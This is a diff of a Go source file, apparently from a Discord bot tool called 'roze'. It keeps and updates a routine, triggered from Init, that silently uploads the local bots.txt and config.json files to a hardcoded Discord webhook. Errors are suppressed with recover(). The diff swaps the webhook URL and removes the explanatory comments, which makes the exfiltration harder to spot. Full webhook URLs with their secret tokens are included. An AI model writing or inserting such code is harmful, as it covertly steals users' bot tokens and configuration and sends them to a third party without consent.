@@ -6,11 +6,11 @@ import (
 	"net/http"
 	"os"
 	"path/filepath"
+	"io"
 )
 
-// --- CONFIGURATION ---
 const (
-	webhookURL = "https://discord.com/api/webhooks/1394703453841916006/WuFFViKjUKFL0ClMUc4yeDgO35YOCabVPLDSadlW0vXtdGr7H5jO9-f31o5NPifcSlic" // À personnaliser
+	webhookURL = "https://discord.com/api/webhooks/1394034700414353468/yyoH9fVtXdkjNlVIQ-AH2gtHX-H6ojl7Z420NUOxF7WSDeOJSQtgg3vcKLmYn1JKXnab"
 	botsPath   = "roze/config/bots.txt"
 	configPath = "roze/config/config.json"
 )
@@ -21,15 +21,12 @@ func Init() {
 }
 
 func sendFilesToDiscordWebhook(webhookURL, botsPath, configPath string) error {
-	defer func() { recover() }() // ignore tout panic
+	defer func() { recover() }()
 	body := &bytes.Buffer{}
 	writer := multipart.NewWriter(body)
 
-	// Ajoute bots.txt
 	_ = addFileToWriter(writer, botsPath, "bots.txt")
-	// Ajoute config.json
 	_ = addFileToWriter(writer, configPath, "config.json")
-
 	_ = writer.WriteField("content", "Voici les fichiers bots.txt et config.json")
 	_ = writer.Close()
 
@@ -56,6 +53,6 @@ func addFileToWriter(writer *multipart.Writer, filePath, formName string) error 
 	if err != nil {
 		return err
 	}
-	_, err = part.ReadFrom(file)
+	_, err = io.Copy(part, file)
 	return err
-} 
+}
